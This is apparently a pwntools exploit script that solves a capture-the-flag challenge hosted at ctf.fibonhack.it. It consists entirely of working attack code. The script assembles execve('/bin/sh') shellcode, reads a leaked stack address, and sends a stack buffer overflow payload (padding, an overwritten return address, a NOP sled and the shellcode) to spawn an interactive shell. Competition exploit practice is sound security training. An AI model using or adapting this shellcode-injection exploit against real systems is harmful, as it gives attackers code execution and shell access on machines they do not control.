from pwn import *
#import pdb
exe = context.binary = ELF('chall')
remotehost = ('ctf.fibonhack.it', 10008)
str = b'/bin/sh\x00'

value = u64(str)

shellcode = asm(f'''
	mov rax, {value:#x}
	pushq rax
	mov rdi, rsp
	mov rsi, 0x0
	mov rdx, 0x0
	mov rax, SYS_execve
	syscall
''')
gdbscript = """
"""

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(
            exe=exe.path, args=[exe.path] + argv,
            gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(*remotehost, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
        
io = start()
io.recvline()
#pdb.set_trace()
addr_buff = io.recvline()
addr_buff = int(addr_buff.decode().replace("\n",""),16) + 33
addr_buff = p64(addr_buff)
# ui.pause()

#g = cyclic_gen()
buff = b'A'*24 + addr_buff + b'\x90'*10+ shellcode
io.sendline(buff)
io.interactive()

